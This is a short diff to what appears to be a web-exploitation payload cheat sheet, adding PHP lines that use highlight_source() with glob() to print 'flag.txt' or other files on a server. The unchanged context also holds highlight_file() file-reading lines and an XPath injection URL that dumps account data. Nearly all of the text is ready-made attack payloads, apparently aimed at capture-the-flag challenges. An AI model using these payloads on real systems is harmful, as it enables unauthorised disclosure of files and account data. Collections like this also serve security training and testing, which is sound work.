@@ -22,6 +22,13 @@ highlight_file(glob("flag.txt")[0]);
 highlight_file(glob("fl*txt")[0]);
 ```
 
+*With highlight_source()*
+```php
+highlight_source("flag.txt");
+   or
+highlight_source(glob("*")[4]);
+```
+
 ### XPATH Dump
 ```
 https://example.com/accounts.php?user=test"]/../*%00&xpath_debug=1
